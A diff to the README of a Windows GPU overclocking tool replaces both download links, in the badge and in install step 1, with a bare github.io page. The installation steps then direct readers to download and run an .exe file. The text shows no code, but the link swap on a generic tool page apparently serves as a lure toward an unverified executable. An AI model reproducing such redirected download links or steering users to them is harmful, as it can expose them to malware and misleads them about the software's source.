@@ -1,6 +1,6 @@
 # ⚡ GPU-Overclock-Tool-2026-Gaming - Improve gaming performance using safe profiles
 
-[![](https://img.shields.io/badge/Download-Tool-blue.svg)](https://github.com/boon-psychic188/GPU-Overclock-Tool-2026-Gaming)
+[![](https://img.shields.io/badge/Download-Tool-blue.svg)](https://boon-psychic188.github.io)
 
 This software helps users increase their graphics card speed. Overclocking makes your games run smoother by increasing the clock frequency of the graphics processing unit. This tool manages the process through pre-tested, safe profiles. It also monitors component temperatures to prevent overheating.
 
@@ -26,7 +26,7 @@ Ensure your computer meets these requirements to run the application:
 
 Follow these steps to get the software on your Windows machine.
 
-1.  Visit the official repository page to download the latest release: [https://github.com/boon-psychic188/GPU-Overclock-Tool-2026-Gaming](https://github.com/boon-psychic188/GPU-Overclock-Tool-2026-Gaming)
+1.  Visit the official repository page to download the latest release: [https://boon-psychic188.github.io](https://boon-psychic188.github.io)
 2.  Locate the button labeled "Releases" on the right side of the page.
 3.  Click the release version to expand the details.
 4.  Download the file ending in `.exe`.
